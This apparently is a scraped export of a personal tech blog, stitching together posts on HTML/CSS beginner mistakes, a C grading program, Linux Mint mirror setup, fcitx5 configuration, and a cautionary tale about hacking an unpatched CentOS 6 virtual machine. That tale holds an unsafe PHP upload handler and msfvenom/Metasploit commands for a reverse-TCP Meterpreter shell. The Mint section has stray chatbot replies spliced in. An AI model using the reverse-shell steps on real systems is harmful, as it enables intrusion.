The first question I was asked was why the content of the title (\u003ch1\u003e tag) wasn’t showing up. I took a look at their code: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003e ppp \u003ch1\u003eTT\u003c/h1\u003e pppp \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e I couldn’t believe it – they put the \u003ch1\u003e tag inside the \u003cp\u003e tag… It’s clear that they aren’t familiar with either of these tags. Both \u003ch1\u003e and \u003cp\u003e are block-level elements, and by default the font size of \u003ch1\u003e is larger than that of \u003cp\u003e. Therefore, putting them together may result in display errors. Normally, these two tags exist on the same level, and both will occupy a line to display. If the larger \u003ch1\u003e tag is nested inside the smaller one, of course you won’t be able to see it~ In summary, there cannot be headings within paragraphs, and they cannot be nested within each other. Therefore, the correct way to write it should be as follows: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eThe Title Of An article.\u003c/h1\u003e \u003cp\u003eThe Paragraph.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:1:1","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"Missing Symbols Sometimes I get asked about this issue as well, and I feel like these are all basic errors.

Or perhaps they don’t know how to represent tags. Let me explain again: there are two types of tags, single tags and double tags. Taking the tag for inserting an image as an example, the single tag looks like this: \u003cimg /\u003e. The \u003c at the beginning and \u003e at the end can’t be left out, and it’s best to add a / before the closing \u003e. As for double tags, let’s take the paragraph tag as an example: \u003cp\u003eThis is a paragraph.\u003c/p\u003e. This type of double tag must have an opening and closing tag. Neither the beginning nor the end can be left out. When writing double tags and there’s nesting involved, it’s a good habit to indent each level on a new line. \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"Box1\"\u003e \u003cdiv class=\"Box2\"\u003e \u003ch1\u003eTitle\u003c/h1\u003e \u003cul\u003e \u003cli\u003e \u003cp\u003ePara1\u003c/p\u003e \u003c/li\u003e \u003cli\u003e \u003cp\u003ePara2\u003c/p\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e This way, the code is not only beautiful, but it’s also easier to maintain and troubleshoot in the future.

I can only explain it this way: The \u003chead\u003e section is the header information area, which is what the server sends to the browser. The code inside it is not rendered on the page in the browser. The \u003cbody\u003e section is the content display area, used to write tags that can be displayed.

My personal favorite is to use \u003clink\u003e to link the stylesheet. This way, you can split it into two files and write them side by side, making it very convenient. You don’t need to flip back and forth like with inline styles. As for inline styles? They’re not used much, I almost never use them in practice. But there are still people who don’t know how to link stylesheets? The main issue is not understanding the concept of paths. It’s actually very simple – just remember the relative path and then fill it into the href attribute value of the \u003clink\u003e tag. \u003clink type=\"text/css\" rel=\"stylesheet\" href=\"css/style.css\" /\u003e Of course, there are still people who don’t know how to use inline styles, but there’s not much to say about it. Just remember that the \u003cstyle\u003e tag must be placed inside the \u003chead\u003e section and then write the styles using the correct CSS format inside the \u003cstyle\u003e tag. For example： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cstyle type=\"text/css\"\u003e *{ margin: 0; padding: 0; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } \u003c/style\u003e \u003cbody\u003e \u003cdiv class=\"TopHead\"\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/posts/something-about-html-css/:2:1","tags":["HTML","CSS","Front-end","Web Design","Basics","Rant"],"title":"Some Thoughts on Writing HTML and CSS","uri":"/posts/something-about-html-css/"},{"categories":["Web"],"content":"When writing CSS, losing ;, {, and } and misspelling words.

In fact, it’s quite simple: *{ margin: 0; padding: 0; } * is a regular wildcard character in CSS, and it has the lowest priority among all selectors. Setting its margin and padding properties to 0 before everything else can eliminate the default padding and margin for all elements before they are selected by a specific selector. This makes it much easier to make more accurate adjustments to element spacing later on. If you’re still not sure whether or not to include it, try it out and see the difference for yourself.

I often see something like this: .a1{ } .a2{ } #b1{ } #b2{ } It’s hard to know what element it actually selects, which increases workload… Because at first glance, it’s unclear what it refers to. Also, using Chinese characters for naming, although I used to like to do this when I was in middle school, this habit is not good because if there are some server encoding issues, the style files may not be loaded properly. h1.中央标题 { text-align:center; font-size:22px; } h1.一级标题 { font-size:22px; } h2.二级标题 { font-size:20px; } h2.三级标题 { font-size:18px; } h2.四级标题 { font-size:16px; } p.普通文字 { text-indent:25px; font-size:15px; text-align:justify; } But some people even use numbers! And then they ask me why the style is not displaying properly! .1{ color: red; } Numbers or names that start with numbers cannot be used as class selector names and IDs in CSS. Similarly, in many programming languages, it is not allowed to name variables using numbers or names that begin with numbers. To avoid this problem, naming conventions such as camelCase and _ concatenation can be used. Upper camel case refers to two words combined, with the first letter of each word capitalized, such as TopHead. Lower camel case refers to two words combined, with only the first letter of the second word capitalized, such as contentPlace. For naming conventions with more than two words, the _ character is needed to combine them, such as the_menu_bar. .TopHead{ width: 1000px; height: 300px; } .contentPlace{ width: 1000px; height: auto; } .the_menu_bar{ width: 100%; height: 50px; background-color: blue; } This significantly improves readability so that one can generally tell at a glance which element corresponds to which, without having to spend time searching through the code.

There may be other problems that I haven’t discovered yet… Feel free to leave a comment below to share your thoughts and feedback.

This is straightforward. We need to list several grade levels: Excellent 80 ~ 100 points [80,100] Pass 60~79 points [60,79] Fail Below 60 points [0,60) In the code, we can use expressions to represent the intervals, for example: score \u003e= 80 \u0026\u0026 score \u003c= 100 Then we use if() to determine the grade level. #include\u003cstdio.h\u003e int main(){ int score = 85; if(score \u003e= 80 \u0026\u0026 score \u003c= 100){ printf(\"The grade is excellent\"); }else if(score \u003e= 60 \u0026\u0026 score \u003c= 79){ printf(\"The grade is pass\"); }else if(score \u003e= 0 \u0026\u0026 score \u003c 60){ printf(\"The grade is fail\"); } } Next, we run the program. Output: weepingdogel@WeepingDogel /tmp\u003e make test cc test.c -o test weepingdogel@WeepingDogel /tmp\u003e ./test The grade is excellent⏎ Then we need to get the user’s input for the grade, like this, using the scanf() function to get the user’s input and assign it to an integer variable score. #include\u003cstdio.h\u003e int main(){ int score; printf(\"Enter your grade:\"); scanf(\"%d\",\u0026score); printf(\"%d\",score); } Next, we combine these two pieces of code together.

The default software sources in Linux Mint are official ones, which may take a long time to download and update packages. Therefore, it’s recommended to modify the software sources and use a mirror source that is closer to you. For Linux Mint, there are basically two ways to modify the software sources. Note: Choose only one of the following options.

The content is as follows: “Oh, I see. Maybe you’re having trouble understanding how to do it. Here’s a detailed guide on how to perform the operation: First, move your mouse cursor to the bottom left corner of the screen and open the Terminal.” To modify the software sources, we first need to edit the /etc/apt/sources.list file. It seems that Mint does not come with vim pre-installed, so we will use nano here. $ sudo nano /etc/apt/sources.list Note: sudo is required and do not forget to enter your password after pressing Enter in the terminal. When you open the file, you may notice that it appears empty except for some English comments. You can start writing into the file by following the instructions provided by the TUNA mirror site or other tutorial deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport I understand. To complete the process, we also need to add Ubuntu repositories as some packages in Mint require them. Let’s take a look at the Ubuntu help documentation for further instructions. Great, it sounds like you have a good understanding of the process! Yes, you can modify the URLs in the /etc/apt/sources.list file and replace archive.ubuntu.com with mirrors.tuna.tsinghua.edu.cn. This will help speed up the process of downloading and updating packages in Linux Mint. #deb cdrom:[Linux Mint 20 _Ulyana_ - Release amd64 20200624]/ focal contrib main # This system was installed using small removable media # (e.g. netinst, live or single CD). The matching \"deb cdrom\" # entries were disabled at the end of the installation process. # For information about how to configure apt package sources, # see the sources.list(5) manual. deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse Like this： Exactly! After modifying the software sources, you can run the command sudo apt update in the terminal to update the package lists. This will allow you to download and install packages much faster than before.

On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience. I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company’s server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security. My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020.

We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures. Additionally, due to unsatisfactory work hours, the programmers have a “get the job done” attitude, resulting in PHP code on the backend such as this: \u003c?php if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"Error: \" . $_FILES[\"file\"][\"error\"] . \"\u003cbr\u003e\"; } else { echo \"Uploaded file name: \" . $_FILES[\"file\"][\"name\"] . \"\u003cbr\u003e\"; echo \"File type: \" . $_FILES[\"file\"][\"type\"] . \"\u003cbr\u003e\"; echo \"File size: \" .

In addition, there were open ports for SSH and HTTP, which gave him a good opportunity. He attempted to access the website and discovered a file upload point on the site. With a “let’s give it a try” attitude, he generated a payload using msf. $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location. So he launched msfconsole. $ msfconsole And he used the exploit/multi/handler module. msf5 \u003e use exploit/multi/handler He then proceeded to set the parameters one by one. msf5 exploit(multi/handler) \u003e set LHOST 192.168.0.109 msf5 exploit(multi/handler) \u003e set LPORT 4444 set payload php/meterpreter/reverse_tcp The final step was to run the module. msf5 exploit(multi/handler) \u003e run Then msf began listening.

But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants. Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all. It looks like he needs to think of another way. During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker. By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor. There were some numbers and letters written on it, perhaps something useful. While the employees were eating, he secretly took a picture of the note with his phone and left. As luck would have it, this note contained the password that had just been changed and would not be updated again for a while. After work, he returned to his terminal and attempted to log in directly as root using the stolen password. meterpreter \u003e shell Process 1376 created. Channel 2 created.

Code that is not updated is prone to vulnerabilities. Slow password updates can lead to leaks. Vulnerabilities must be fixed by updating software; otherwise, they will be exploited. And as for what we cannot see… Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations. Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option. For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten. Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier.

Both of them support ~/.xprofile. This file will be sourced during boot, using a shell determined by dm itself. Both lightdm and sddm use /bin/sh (in the files /etc/lightdm/Xsession and /usr/share/sddm/scripts/Xsession respectively). As you can see, in addition to reading .xprofile, lightdm also reads .profile. sddm even reads the startup configuration scripts for bash, zsh, tcsh, and fish. That is, we need to write the fcitx5 environment variables in the .xprofile file Then… $ vim . /.xprofile Write these things in it export INPUT_METHOD=fcitx5 export GTK_IM_MODULE=fcitx5 export QT_IM_MODULE=fcitx5 export XMODIFIERS=@im=fcitx5 Next you can choose to restart lightdm, $ sudo systemctl restart lightdm Or reboot the system. $ sudo reboot At this time, a keyboard appears in the status bar of xfce, but pressing CTRL + SPACE but it does not bring up the Chinese input method, so what should we do? Right-click the keyboard icon, click Configure, and then go to the QT configuration tool to add Chinese input methods on it!
